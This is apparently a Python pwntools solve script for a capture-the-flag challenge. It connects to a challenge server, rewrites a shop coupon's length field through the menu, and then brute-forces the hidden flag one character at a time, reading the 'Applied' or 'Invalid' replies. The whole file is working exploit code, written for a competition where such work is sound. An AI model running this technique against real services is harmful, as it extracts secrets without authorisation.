from pwn import *
import string

context.log_level = "Error"

flag = "CSA{"
EDIT_ITEM = b"2"
EDIT_AMOUNT_ITEMS = b"3"
EDIT_LOAVES = b"4"
COUPON_INDEX = b"2"

ALPHABET = string.printable

def wait_menu_end():
    r.recvuntil(b"Checkout\r\n")

def edit_item(index, property, value):
    wait_menu_end()
    r.sendline(EDIT_ITEM)
    r.recvuntil(b"edit?\r\n")
    r.sendline(index)
    r.recvuntil(b"Cancel\r\n")
    r.sendline(property)
    r.recvuntil(b"amount: ")
    r.sendline(value)
    
def to_fruit_length_to_coupon():
    global flag
    """edits the coupon's length to len(flag) + 1"""
    new_length = len(flag) + 1
    edit_item(COUPON_INDEX, EDIT_LOAVES, str(new_length).encode())
    
    edit_item(COUPON_INDEX, EDIT_AMOUNT_ITEMS, b"0")

    wait_menu_end()
    r.sendline(EDIT_ITEM)
    r.recvuntil(b"edit?\r\n")
    r.sendline(COUPON_INDEX)

def bruteforce():
    global flag
    for c in ALPHABET:
        wait_menu_end()
        r.sendline(b"5")
        r.recvuntil(b"Please enter your coupon:\r\n")
        r.sendline((flag + c).encode())
        line = r.recvuntil(b"\r\n").decode()
        if "Invalid" in line:
            continue
        if "Applied" in line:
            print(f"found new flag: {flag}{c}")
            flag += c
            if c == "}":
                print("finished!")
                exit()
            return
        else:
            print("something strage is afoot")
            exit(0)

while True:
    r = remote('csa-2.csa-challenge.com', 2222)
    wait_menu_end()
    r.sendline(b"5")
    r.recvuntil(b"Please enter your coupon:\r\n")
    r.sendline(b"AAAAAAA")

    to_fruit_length_to_coupon()
    bruteforce()
